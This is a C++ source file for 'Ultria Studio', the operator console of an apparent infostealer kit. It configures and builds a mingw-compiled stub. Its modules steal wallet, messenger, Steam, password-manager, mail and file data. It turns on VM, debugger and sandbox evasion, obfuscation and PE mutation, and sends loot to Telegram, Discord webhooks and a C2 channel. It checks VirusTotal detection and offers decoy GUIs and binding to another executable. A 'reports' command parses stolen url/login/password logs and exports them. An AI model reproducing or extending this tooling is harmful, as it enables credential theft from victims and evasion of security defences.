// Ultria Studio — build & operations manager.
// One codebase, two natives: Windows (.exe via mingw) and Linux (direct g++).
// Central control point: configures and launches the build pipeline, browses
// collected reports (zip/txt), drives the VirusTotal check.
//
//   ultria-studio                     interactive menu
//   ultria-studio build [...]         run the build pipeline
//   ultria-studio reports --dir X     parse reports (search/export/stats)
//   ultria-studio vt <binary>         VirusTotal check
//   ultria-studio doctor              toolchain sanity check
//   ultria-studio config [--show]     show the current build config
//   ultria-studio clean               wipe build artifacts
#include "studio.h"
#include "../common/combo.h"

#ifdef _WIN32
#include <windows.h>
#else
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <climits>
#endif

#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <map>
#include <set>
#include <sstream>
#include <string>
#include <vector>

extern "C" {
#include "../../third_party/miniz.h"
}

namespace studio {

// ---------------- platform helpers ----------------
namespace {
const char* C_RESET = "\x1b[0m";
const char* C_CYAN = "\x1b[36m";
const char* C_VIOLET = "\x1b[35m";
const char* C_DIM = "\x1b[90m";
const char* C_GREEN = "\x1b[32m";
const char* C_RED = "\x1b[31m";
const char* C_BOLD = "\x1b[1m";

inline const char* path_sep() {
#ifdef _WIN32
    return "\\";
#else
    return "/";
#endif
}

std::string join(const std::string& a, const std::string& b) {
    if (a.empty()) return b;
    if (a.back() == '\\' || a.back() == '/') return a + b;
    return a + path_sep() + b;
}

#ifdef _WIN32
void enable_ansi() {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if (GetConsoleMode(h, &mode))
        SetConsoleMode(h, mode | 0x0004 /*ENABLE_VIRTUAL_TERMINAL_PROCESSING*/);
}
std::wstring widen(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring out(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), out.data(), n);
    return out;
}
std::string narrow(const std::wstring& s) {
    if (s.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), out.data(), n, nullptr, nullptr);
    return out;
}
std::string exe_dir() {
    wchar_t buf[MAX_PATH * 2] = {};
    DWORD n = GetModuleFileNameW(nullptr, buf, MAX_PATH * 2);
    std::string p = narrow(std::wstring(buf, n));
    auto slash = p.find_last_of("\\/");
    return slash == std::string::npos ? "." : p.substr(0, slash);
}
bool file_exists(const std::string& p) {
    DWORD a = GetFileAttributesW(widen(p).c_str());
    return a != INVALID_FILE_ATTRIBUTES;
}
bool is_dir(const std::string& p) {
    DWORD a = GetFileAttributesW(widen(p).c_str());
    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
}
int run_cmd(const std::string& cmd, const std::string& workdir = {}) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring wcmd = widen(cmd);
    std::wstring wdir = widen(workdir);
    if (!CreateProcessW(nullptr, wcmd.data(), nullptr, nullptr, TRUE, 0, nullptr,
                        wdir.empty() ? nullptr : wdir.c_str(), &si, &pi))
        return -1;
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD rc = 1;
    GetExitCodeProcess(pi.hProcess, &rc);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)rc;
}
#else // POSIX
void enable_ansi() {}
std::string exe_dir() {
    char buf[PATH_MAX] = {};
    ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    std::string p = (n > 0) ? std::string(buf, n) : ".";
    auto slash = p.find_last_of('/');
    return slash == std::string::npos ? "." : p.substr(0, slash);
}
bool file_exists(const std::string& p) {
    struct stat st;
    return ::stat(p.c_str(), &st) == 0;
}
bool is_dir(const std::string& p) {
    struct stat st;
    return ::stat(p.c_str(), &st) == 0 && S_ISDIR(st.st_mode);
}
int run_cmd(const std::string& cmd, const std::string& workdir = {}) {
    std::string full;
    if (!workdir.empty()) full += "cd '" + workdir + "' && ";
    full += cmd;
    return std::system(full.c_str());
}
#endif

// walk up from the exe dir to find the repo root (tools/builder.py marker)
std::string find_root() {
    std::string dir = exe_dir();
    for (int i = 0; i < 4; ++i) {
        if (file_exists(join(join(dir, "tools"), "builder.py"))) return dir;
        auto slash = dir.find_last_of("\\/");
        if (slash == std::string::npos) break;
        dir = dir.substr(0, slash);
    }
    return exe_dir();
}

// UI modes are detected from the source tree (src/gui/<mode>_gui.cpp) — the
// studio never hardcodes the list of available interfaces.
std::vector<std::string> discover_gui_modes(const std::string& root) {
    std::vector<std::string> modes;
    const std::string dir = join(join(root, "src"), "gui");
#ifdef _WIN32
    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW(widen(join(dir, "*_gui.cpp")).c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            std::string name = narrow(fd.cFileName);
            if (name.size() > 8 && name.compare(name.size() - 8, 8, "_gui.cpp") == 0)
                modes.push_back(name.substr(0, name.size() - 8));
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
#else
    DIR* d = opendir(dir.c_str());
    if (d) {
        struct dirent* ent;
        while ((ent = readdir(d))) {
            std::string name = ent->d_name;
            if (name.size() > 8 && name.compare(name.size() - 8, 8, "_gui.cpp") == 0)
                modes.push_back(name.substr(0, name.size() - 8));
        }
        closedir(d);
    }
#endif
    std::sort(modes.begin(), modes.end());
    return modes;
}

std::string gui_mode_list(const std::string& root) {
    std::string list = "none";
    for (const auto& m : discover_gui_modes(root)) list += "|" + m;
    return list;
}

// minimal value reader for builder_config.json (string/scalar)
std::string read_file_str(const std::string& file) {
    std::ifstream f(file);
    if (!f.is_open()) return {};
    return std::string((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
}
std::string json_get_str(const std::string& file, const std::string& key, const std::string& def) {
    std::string body = read_file_str(file);
    if (body.empty()) return def;
    std::string pat = "\"" + key + "\"";
    auto pos = body.find(pat);
    if (pos == std::string::npos) return def;
    pos = body.find(':', pos);
    if (pos == std::string::npos) return def;
    pos = body.find('"', pos);
    if (pos == std::string::npos) return def;
    auto end = body.find('"', pos + 1);
    if (end == std::string::npos) return def;
    return body.substr(pos + 1, end - pos - 1);
}

std::string python_cmd() {
    // prefer python3 everywhere; on Windows shells it is usually python3 or python
    return "python3";
}

std::string shell_prefix() {
#ifdef _WIN32
    return "cmd.exe /C ";
#else
    return "";
#endif
}
} // namespace

// ---------------- build ----------------
struct BuildOpts {
    std::string tg_token, tg_chat, webhook;
    std::string discord_webhook;
    std::string c2_token, c2_channel, c2_operator_id;
    std::string gui_mode;  // empty = keep the configured mode
    std::string output_name;
    std::string bind_exe;
    std::string build_tag;
    int obf_level = -1;
    double target_size_mb = -1;
    bool no_vt = false;
    bool debug = false;
};

void write_builder_config(const std::string& path, const BuildOpts& o) {
    std::ostringstream j;
    j << "{\n";
    j << "  \"tg_bot_token\": \"" << o.tg_token << "\",\n";
    j << "  \"tg_chat_id\": \"" << o.tg_chat << "\",\n";
    j << "  \"webhook_url\": \"" << o.webhook << "\",\n";
    j << "  \"discord_webhook\": \"" << o.discord_webhook << "\",\n";
    j << "  \"c2_channel_id\": \"" << o.c2_channel << "\",\n";
    j << "  \"build_tag\": \"" << (o.build_tag.empty() ? "ultria" : o.build_tag) << "\",\n";
    if (!o.output_name.empty()) j << "  \"output_name\": \"" << o.output_name << "\",\n";
    j << "  \"gui_mode\": \"" << o.gui_mode << "\",\n";
    j << "  \"bind_exe\": \"" << o.bind_exe << "\",\n";
    if (o.obf_level >= 0) j << "  \"obf_level\": " << o.obf_level << ",\n";
    if (o.target_size_mb >= 0) j << "  \"target_size_mb\": " << o.target_size_mb << ",\n";
    j << "  \"enable_vm_check\": true,\n  \"enable_debug_check\": true,\n"
         "  \"enable_sandbox_check\": true,\n  \"enable_persistence\": false,\n"
         "  \"self_delete\": false,\n  \"collect_screenshot\": true,\n";
    j << "  \"modules\": {\n    \"steam\": true, \"discord\": true, \"telegram\": true,\n"
         "    \"wallets\": true, \"games\": true, \"messengers\": true, \"vpn\": true,\n"
         "    \"ftp\": true, \"mail\": true, \"pwmanagers\": true, \"socials\": true, \"files\": true\n  }\n";
    j << "}\n";
    std::ofstream f(path);
    f << j.str();
}

// Bot token + operator id are local-only (git-ignored). They are never written
// to builder_config.json so the config stays safe to publish on GitHub.
void write_builder_secrets(const std::string& path, const BuildOpts& o) {
    std::ostringstream j;
    j << "{\n";
    j << "  \"c2_bot_token\": \"" << o.c2_token << "\",\n";
    j << "  \"c2_operator_id\": \"" << o.c2_operator_id << "\",\n";
    j << "}\n";
    std::ofstream f(path);
    f << j.str();
}

int cmd_build(const BuildOpts& o) {
    std::string root = find_root();
    std::string cfg = join(root, "builder_config.json");
    std::string secrets = join(root, "builder_secrets.json");

    BuildOpts merged = o;
    if (merged.tg_token.empty()) merged.tg_token = json_get_str(cfg, "tg_bot_token", "");
    if (merged.tg_chat.empty()) merged.tg_chat = json_get_str(cfg, "tg_chat_id", "");
    if (merged.webhook.empty()) merged.webhook = json_get_str(cfg, "webhook_url", "");
    if (merged.discord_webhook.empty()) merged.discord_webhook = json_get_str(cfg, "discord_webhook", "");
    // Bot credentials come from the local, git-ignored secrets file only.
    if (merged.c2_token.empty()) merged.c2_token = json_get_str(secrets, "c2_bot_token", "");
    if (merged.c2_channel.empty()) merged.c2_channel = json_get_str(cfg, "c2_channel_id", "");
    if (merged.c2_operator_id.empty()) merged.c2_operator_id = json_get_str(secrets, "c2_operator_id", "");
    if (merged.gui_mode.empty()) merged.gui_mode = json_get_str(cfg, "gui_mode", "none");
    if (merged.output_name.empty()) merged.output_name = json_get_str(cfg, "output_name", "");
    {
        const auto modes = discover_gui_modes(root);
        bool known = merged.gui_mode == "none" || merged.gui_mode.empty();
        for (const auto& m : modes) known = known || m == merged.gui_mode;
        if (!known) {
            printf("%s[studio]%s unknown gui mode '%s' — detected: %s\n",
                   C_RED, C_RESET, merged.gui_mode.c_str(), gui_mode_list(root).c_str());
            return 1;
        }
    }
    write_builder_config(cfg, merged);
    write_builder_secrets(secrets, merged);

    printf("%s[studio]%s root=%s\n", C_CYAN, C_RESET, root.c_str());
    printf("%s[studio]%s gui=%s obf=%s size=%s discord=%s\n", C_CYAN, C_RESET,
           merged.gui_mode.c_str(),
           o.obf_level >= 0 ? std::to_string(o.obf_level).c_str() : "cfg",
           o.target_size_mb >= 0 ? std::to_string(o.target_size_mb).c_str() : "cfg",
           merged.discord_webhook.empty() ? "off" : "set");

    std::string args = " tools/builder.py";
    if (o.no_vt) args += " --no-vt";
    if (o.debug) args += " --debug";
    if (o.obf_level >= 0) args += " --obf " + std::to_string(o.obf_level);
    if (o.target_size_mb >= 0) args += " --size " + std::to_string(o.target_size_mb);
    int rc = run_cmd(shell_prefix() + python_cmd() + args, root);
    if (rc != 0) {
        int rc2 = run_cmd(shell_prefix() + "python" + args, root);
        if (rc2 == 0) rc = 0;
    }
    return rc;
}

// ---------------- reports ----------------
struct ReportStats {
    int zips = 0;
    long long parsed = 0;
    std::set<std::string> unique;
    std::map<std::string, int> hosts;
    std::vector<combo::Entry> matches;
};

void ingest_text(const std::string& text, ReportStats& st, const std::string& query) {
    size_t pos = 0;
    while (pos <= text.size()) {
        size_t nl = text.find_first_of("\r\n", pos);
        std::string line = text.substr(pos, nl == std::string::npos ? std::string::npos : nl - pos);
        combo::Entry e;
        if (combo::parse_line(line, e)) {
            st.parsed++;
            std::string key = e.url + "|" + e.login + "|" + e.pass;
            if (st.unique.insert(key).second)
                st.hosts[combo::host_of(e.url)]++;
            if (!query.empty()) {
                std::string q = combo::lower(query);
                if (combo::lower(e.url).find(q) != std::string::npos ||
                    combo::lower(e.login).find(q) != std::string::npos ||
                    combo::lower(e.pass).find(q) != std::string::npos)
                    st.matches.push_back(e);
            }
        }
        if (nl == std::string::npos) break;
        pos = nl + 1;
    }
}

bool is_text_entry(const std::string& lower_name) {
    static const char* exts[] = {".txt", ".log", ".csv", ".json"};
    for (auto* e : exts) {
        size_t l = strlen(e);
        if (lower_name.size() > l && lower_name.compare(lower_name.size() - l, l, e) == 0)
            return true;
    }
    return false;
}

void ingest_file(const std::string& full, const std::string& name, ReportStats& st,
                 const std::string& query) {
    std::string lower = combo::lower(name);
    if (lower.size() > 4 && lower.compare(lower.size() - 4, 4, ".zip") == 0) {
        st.zips++;
        mz_zip_archive zip{};
        if (mz_zip_reader_init_file(&zip, full.c_str(), 0)) {
            int n = (int)mz_zip_reader_get_num_files(&zip);
            for (int i = 0; i < n; ++i) {
                mz_zip_archive_file_stat fs;
                if (!mz_zip_reader_file_stat(&zip, i, &fs)) continue;
                if (fs.m_is_directory || fs.m_uncomp_size > 64ull * 1024 * 1024) continue;
                if (!is_text_entry(combo::lower(fs.m_filename))) continue;
                size_t size = 0;
                void* p = mz_zip_reader_extract_to_heap(&zip, i, &size, 0);
                if (p) {
                    ingest_text(std::string((char*)p, size), st, query);
                    mz_free(p);
                }
            }
            mz_zip_reader_end(&zip);
        }
    } else if (is_text_entry(lower)) {
        std::ifstream f(full, std::ios::binary);
        if (f.is_open()) {
            std::string text((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            ingest_text(text, st, query);
        }
    }
}

void scan_dir(const std::string& dir, ReportStats& st, const std::string& query) {
#ifdef _WIN32
    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW(widen(join(dir, "*")).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        std::wstring name(fd.cFileName);
        if (name == L"." || name == L"..") continue;
        std::string sname = narrow(name);
        std::string full = join(dir, sname);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_dir(full, st, query);
            continue;
        }
        ingest_file(full, sname, st, query);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
#else
    DIR* d = opendir(dir.c_str());
    if (!d) return;
    struct dirent* ent;
    while ((ent = readdir(d))) {
        std::string name = ent->d_name;
        if (name == "." || name == "..") continue;
        std::string full = join(dir, name);
        if (is_dir(full)) {
            scan_dir(full, st, query);
            continue;
        }
        ingest_file(full, name, st, query);
    }
    closedir(d);
#endif
}

int cmd_reports(const std::string& dir, const std::string& query, const std::string& export_path) {
    if (!file_exists(dir)) {
        printf("%s[studio]%s directory not found: %s\n", C_RED, C_RESET, dir.c_str());
        return 1;
    }
    ReportStats st;
    printf("%s[studio]%s scanning %s ...\n", C_CYAN, C_RESET, dir.c_str());
    scan_dir(dir, st, query);

    printf("\n%s== report summary ==%s\n", C_BOLD, C_RESET);
    printf("  zips seen   : %d\n", st.zips);
    printf("  combos      : %lld (%zu unique)\n", st.parsed, st.unique.size());
    if (!query.empty())
        printf("  matches '%s': %zu\n", query.c_str(), st.matches.size());

    std::vector<std::pair<std::string, int>> top(st.hosts.begin(), st.hosts.end());
    std::sort(top.begin(), top.end(), [](auto& a, auto& b) { return a.second > b.second; });
    printf("\n%s== top hosts ==%s\n", C_BOLD, C_RESET);
    for (size_t i = 0; i < top.size() && i < 15; ++i)
        printf("  %6d  %s\n", top[i].second, top[i].first.c_str());

    if (!export_path.empty()) {
        if (query.empty()) {
            printf("%s[studio]%s export needs --search (full dump not retained in memory)\n", C_DIM, C_RESET);
        } else {
            std::ofstream out(export_path);
            for (auto& e : st.matches) out << combo::to_line(e) << "\n";
            printf("%s[studio]%s exported %zu matches -> %s\n", C_GREEN, C_RESET,
                   st.matches.size(), export_path.c_str());
        }
    }
    return 0;
}

// ---------------- vt ----------------
int cmd_vt(const std::string& binary) {
    std::string root = find_root();
    std::string args = " tools/vt_check.py \"" + binary + "\" --watch";
    int rc = run_cmd(shell_prefix() + python_cmd() + args, root);
    if (rc != 0) {
        int rc2 = run_cmd(shell_prefix() + "python" + args, root);
        if (rc2 == 0) rc = 0;
    }
    return rc;
}

// ---------------- checker UI ----------------
// The checker is the second included UI template. It is built by `make`
// alongside the stub, and can be opened directly from the studio.
int cmd_checker(bool build_first) {
    std::string root = find_root();
    std::string exe = join(join(root, "dist"), "ultria-checker.exe");
    if (build_first || !file_exists(exe)) {
        printf("%s[studio]%s building checker UI...\n", C_CYAN, C_RESET);
        if (run_cmd(shell_prefix() + "make dist/ultria-checker.exe", root) != 0) {
            printf("%s[studio]%s checker build failed\n", C_RED, C_RESET);
            return 1;
        }
    }
    if (!file_exists(exe)) {
        printf("%s[studio]%s checker binary missing: %s\n", C_RED, C_RESET, exe.c_str());
        return 1;
    }
#ifdef _WIN32
    std::string launch = "\"" + exe + "\"";
#else
    std::string launch = "wine \"" + exe + "\"";
#endif
    printf("%s[studio]%s launching checker UI\n", C_CYAN, C_RESET);
    return run_cmd(launch, root);
}

// ---------------- doctor ----------------
int cmd_doctor() {
    std::string root = find_root();
    printf("%s== ultria studio · doctor ==%s\n", C_BOLD, C_RESET);
    printf("  root            : %s\n", root.c_str());
    printf("  builder.py      : %s\n", file_exists(join(join(root, "tools"), "builder.py")) ? "ok" : "MISSING");
    printf("  mutate.py       : %s\n", file_exists(join(join(root, "tools"), "mutate.py")) ? "ok" : "MISSING");
    printf("  vt_check.py     : %s\n", file_exists(join(join(root, "tools"), "vt_check.py")) ? "ok" : "MISSING");
    std::string cfg = join(root, "builder_config.json");
    printf("  tg token        : %s\n", json_get_str(cfg, "tg_bot_token", "").empty() ? "not set" : "set");
    printf("  discord webhook : %s\n", json_get_str(cfg, "discord_webhook", "").empty() ? "not set" : "set");
    printf("  c2 bot token    : %s (local secrets file)\n",
           json_get_str(join(root, "builder_secrets.json"), "c2_bot_token", "").empty() ? "not set" : "set");
    printf("  relay endpoint  : built-in (obfuscated)\n");
    printf("  dist/           : %s\n", is_dir(join(root, "dist")) ? "ok" : "not built yet");
    printf("  ui modes        : %s (auto-detected)\n", gui_mode_list(root).c_str());
    const char* vt = getenv("VT_API_KEY");
    printf("  VT_API_KEY      : %s\n", (vt && *vt) ? "set" : "not set");
#ifdef _WIN32
    printf("  host            : windows (cross-compiled stub target)\n");
#else
    printf("  host            : linux (native; stub cross-compiled via mingw)\n");
#endif
    printf("\n  pipeline: builder.py (seed+config) -> make (mingw) -> mutate.py (PE) -> vt_check.py\n");
    return 0;
}

// ---------------- config / clean ----------------
int cmd_config(bool show) {
    std::string root = find_root();
    std::string cfg = join(root, "builder_config.json");
    std::string body = read_file_str(cfg);
    if (body.empty()) {
        printf("%s[studio]%s no builder_config.json at %s\n", C_RED, C_RESET, cfg.c_str());
        return 1;
    }
    if (show) {
        printf("%s== builder_config.json ==%s\n%s\n", C_BOLD, C_RESET, body.c_str());
    }
    return 0;
}

int cmd_clean() {
    std::string root = find_root();
    printf("%s[studio]%s cleaning build artifacts\n", C_CYAN, C_RESET);
    return run_cmd(shell_prefix() + "make clean", root);
}

// ---------------- interactive ----------------
int interactive() {
    enable_ansi();
    printf("%s   ╦ ╦╦ ╔╦╗╦═╗╦╔═╗   studio%s\n", C_CYAN, C_RESET);
    printf("%s   ║ ║║  ║ ╠╦╝║╠═╣   build manager · reports · vt%s\n\n", C_DIM, C_RESET);

    for (;;) {
        printf("%s[1]%s build   %s[2]%s reports   %s[3]%s vt check   %s[4]%s doctor   %s[5]%s config   %s[6]%s checker   %s[7]%s quit\n",
               C_CYAN, C_RESET, C_CYAN, C_RESET, C_CYAN, C_RESET, C_CYAN, C_RESET, C_CYAN, C_RESET,
               C_CYAN, C_RESET, C_CYAN, C_RESET);
        printf("%s> %s", C_BOLD, C_RESET);
        char line[1024] = {};
        if (!fgets(line, sizeof(line), stdin)) break;
        std::string choice = combo::trim(line);
        if (choice == "7" || choice == "q" || choice == "quit") break;
        if (choice == "1") {
            BuildOpts o;
            char buf[1024];
            printf("  gui mode [%s] (enter=keep): ", gui_mode_list(find_root()).c_str());
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.gui_mode = s; }
            printf("  obfuscation level [0-3] (enter=config): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.obf_level = atoi(s.c_str()); }
            printf("  target size MB [0=off]: ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.target_size_mb = atof(s.c_str()); }
            printf("  discord webhook URL (enter=keep): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.discord_webhook = s; }
            printf("  telegram bot token (enter=keep): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.tg_token = s; }
            printf("  c2 bot token (enter=keep): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.c2_token = s; }
            printf("  c2 channel id (enter=keep): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.c2_channel = s; }
            printf("  c2 operator id (your discord user id, enter=keep): ");
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) o.c2_operator_id = s; }
            printf("  start the build now? [y/N]: ");
            std::string confirm;
            if (fgets(buf, sizeof(buf), stdin)) confirm = combo::trim(buf);
            if (confirm == "y" || confirm == "Y" || confirm == "yes" || confirm == "YES")
                cmd_build(o);
            else
                printf("  build cancelled — nothing was started.\n");
        } else if (choice == "2") {
            char buf[1024];
            printf("  reports directory: ");
            if (fgets(buf, sizeof(buf), stdin)) {
                std::string dir = combo::trim(buf);
                printf("  search (enter=skip): ");
                std::string q;
                if (fgets(buf, sizeof(buf), stdin)) q = combo::trim(buf);
                printf("  export to (enter=skip): ");
                std::string ex;
                if (fgets(buf, sizeof(buf), stdin)) ex = combo::trim(buf);
                cmd_reports(dir, q, ex);
            }
        } else if (choice == "3") {
            char buf[1024];
            printf("  binary path [dist/ultria.exe]: ");
            std::string bin = "dist/ultria.exe";
            if (fgets(buf, sizeof(buf), stdin)) { std::string s = combo::trim(buf); if (!s.empty()) bin = s; }
            cmd_vt(bin);
        } else if (choice == "4") {
            cmd_doctor();
        } else if (choice == "5") {
            cmd_config(true);
        } else if (choice == "6") {
            cmd_checker(false);
        }
    }
    return 0;
}

int cli_main(int argc, char** argv) {
    enable_ansi();
    if (argc < 2) {
#ifndef _WIN32
        // Launched from a file manager or desktop shortcut: stdin/stdout are not
        // a terminal, so a plain menu would print once and vanish. Relaunch the
        // binary inside a terminal emulator instead, and keep it open.
        if (!isatty(STDIN_FILENO) && !isatty(STDOUT_FILENO) && getenv("DISPLAY") &&
            !getenv("UTRIA_NO_TERM")) {
            char self[4096] = {};
            ssize_t n = readlink("/proc/self/exe", self, sizeof(self) - 1);
            if (n > 0 && self[0]) {
                std::string term = getenv("TERMINAL") ? getenv("TERMINAL") : "";
                const char* cands[] = {"x-terminal-emulator", "xfce4-terminal",
                                       "konsole", "gnome-terminal", "xterm"};
                for (int i = 0; term.empty() && i < 5; ++i) {
                    char probe[512];
                    std::snprintf(probe, sizeof(probe), "command -v %s >/dev/null 2>&1", cands[i]);
                    if (std::system(probe) == 0) term = cands[i];
                }
                if (!term.empty()) {
                    std::string cmd = term + " -title \"Ultria Studio\" -e \"" +
                                      std::string(self) + "\" >/dev/null 2>&1 &";
                    if (term == "gnome-terminal")
                        cmd = term + " -- \"" + std::string(self) + "\" >/dev/null 2>&1 &";
                    std::system(cmd.c_str());
                    return 0;
                }
            }
            std::printf("ultria-studio: the interactive menu needs a terminal window.\n"
                        "Open a terminal and run: %s   (or use a command: ultria-studio help)\n",
                        self[0] ? self : "ultria-studio");
            return 0;
        }
#endif
        return interactive();
    }

    std::string cmd = argv[1];
    if (cmd == "help" || cmd == "--help" || cmd == "-h") {
        printf("ultria-studio <command> [options]\n\n");
        printf("  build     --gui none|<detected mode> --obf 0-3 --size MB --output name.exe\n");
        printf("            --token TG_TOKEN --chat TG_CHAT --discord WEBHOOK_URL\n");
        printf("            --webhook URL --bind app.exe [--no-vt] [--debug]\n");
        printf("  reports   --dir <folder> [--search <term>] [--export out.txt]\n");
        printf("  checker   [--build]   open the checker UI (second included template)\n");
        printf("                UI templates: checker (standalone) + hotmail (--gui hotmail decoy)\n");
        printf("  vt        <binary path>\n");
        printf("  doctor    toolchain/config sanity check\n");
        printf("  config    --show    print the current build config\n");
        printf("  clean     wipe build artifacts\n");
        return 0;
    }
    if (cmd == "doctor") return cmd_doctor();
    if (cmd == "checker") {
        bool build_first = false;
        for (int i = 2; i < argc; ++i)
            if (std::string(argv[i]) == "--build") build_first = true;
        return cmd_checker(build_first);
    }
    if (cmd == "clean") return cmd_clean();
    if (cmd == "config") return cmd_config(true);
    if (cmd == "vt") return cmd_vt(argc > 2 ? argv[2] : "dist/ultria.exe");
    if (cmd == "build") {
        BuildOpts o;
        for (int i = 2; i < argc; ++i) {
            std::string a = argv[i];
            auto next = [&]() -> std::string { return i + 1 < argc ? argv[++i] : ""; };
            if (a == "--gui") o.gui_mode = next();
            else if (a == "--obf") o.obf_level = atoi(next().c_str());
            else if (a == "--size") o.target_size_mb = atof(next().c_str());
            else if (a == "--output") o.output_name = next();
            else if (a == "--token") o.tg_token = next();
            else if (a == "--chat") o.tg_chat = next();
            else if (a == "--webhook") o.webhook = next();
            else if (a == "--discord") o.discord_webhook = next();
            else if (a == "--c2-token") o.c2_token = next();
            else if (a == "--c2-channel") o.c2_channel = next();
            else if (a == "--c2-operator") o.c2_operator_id = next();
            else if (a == "--bind") o.bind_exe = next();
            else if (a == "--tag") o.build_tag = next();
            else if (a == "--no-vt") o.no_vt = true;
            else if (a == "--debug") o.debug = true;
        }
        return cmd_build(o);
    }
    if (cmd == "reports") {
        std::string dir, query, export_path;
        for (int i = 2; i < argc; ++i) {
            std::string a = argv[i];
            auto next = [&]() -> std::string { return i + 1 < argc ? argv[++i] : ""; };
            if (a == "--dir") dir = next();
            else if (a == "--search") query = next();
            else if (a == "--export") export_path = next();
        }
        if (dir.empty()) {
            printf("usage: ultria-studio reports --dir <folder> [--search term] [--export out.txt]\n");
            return 1;
        }
        return cmd_reports(dir, query, export_path);
    }
    printf("unknown command '%s' (try: ultria-studio help)\n", cmd.c_str());
    return 1;
}

} // namespace studio

int main(int argc, char** argv) {
    return studio::cli_main(argc, argv);
}
